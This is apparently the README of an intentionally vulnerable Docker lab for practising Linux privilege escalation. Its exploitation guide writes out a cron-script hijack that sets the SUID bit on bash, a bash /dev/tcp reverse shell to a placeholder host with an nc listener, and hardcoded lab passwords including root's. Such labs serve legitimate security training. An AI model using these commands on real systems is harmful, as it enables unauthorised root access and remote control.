
[Lab Screenshot](img.png)

# 🔥 Privilege Escalation Lab - Docker Edition

![Docker](https://img.shields.io/badge/Docker-Containerized-blue)
![Security](https://img.shields.io/badge/Category-Security%20Lab-red)
![License](https://img.shields.io/badge/License-MIT-green)

A deliberately vulnerable Docker environment to practice Linux privilege escalation techniques.

## 🚀 Quick Start

```bash
# Build and run the lab
docker build -t priv_esc_lab .
docker run -d -p 2222:22 -p 5000:5000 --name esc_lab priv_esc_lab
```






The full Answer ⬇️







## 🎯 Lab Features

- 🐍 Flask web app running as user `jerry`
- 🔑 SSH access with pre-configured keys
- ⏲️ Vulnerability: Root-owned script executing `/tmp/cronjob.sh` every 30s
- 🕵️ Stealthy auto-deletion of exploit artifacts

## 💣 Exploitation Guide

### Method 1: SUID Bit Escalation

```bash
echo '#!/bin/bash' > /tmp/cronjob.sh
echo 'chmod +s /bin/bash' >> /tmp/cronjob.sh
chmod +x /tmp/cronjob.sh
# Wait 30 seconds...
/bin/bash -p  # Boom! Root shell
```

### Method 2: Reverse Shell

```bash
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > /tmp/cronjob.sh
# On your machine:
nc -lvnp 4444
```

## 🔧 Technical Details

| Component       | Configuration                          |
|-----------------|----------------------------------------|
| SSH Port        | 2222 (Key-based auth only)             |
| Web App Port    | 5000                                   |
| Vulnerable User |  `jerry` (Password: `ynm777!2`)        |
| Root Password   | `zm6Y5413sfFa`                         |

## 📝 Notes
- **Legal Use Only**: For educational purposes
- **Warning**: Never expose this container to untrusted networks!

## 📜 License
MIT © Amir niko
```

